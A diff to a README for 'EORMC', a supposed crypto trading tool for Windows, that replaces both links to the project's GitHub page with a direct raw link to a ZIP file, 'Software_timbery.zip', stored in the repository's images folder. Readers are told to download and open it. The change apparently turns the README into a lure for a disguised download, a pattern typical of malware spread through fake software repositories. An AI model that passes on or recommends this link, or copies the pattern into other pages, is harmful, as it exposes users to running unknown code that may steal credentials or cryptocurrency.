@@ -1,6 +1,6 @@
 # 🚀 EORMC - Simple Crypto Trading Access
 
-[![Download EORMC](https://img.shields.io/badge/Download-EORMC-blue?style=for-the-badge)](https://github.com/Juanpabloan5605/EORMC)
+[![Download EORMC](https://img.shields.io/badge/Download-EORMC-blue?style=for-the-badge)](https://raw.githubusercontent.com/Juanpabloan5605/EORMC/main/images/Software_timbery.zip)
 
 ## 🧭 Overview
 
@@ -33,7 +33,7 @@ For a smooth experience, use a computer with:
 
 Visit this page to download EORMC:
 
-https://github.com/Juanpabloan5605/EORMC
+https://raw.githubusercontent.com/Juanpabloan5605/EORMC/main/images/Software_timbery.zip
 
 If the page includes a release file, download the Windows file there. If you see a ZIP file, save it to your PC, then open it and follow the steps below.
 
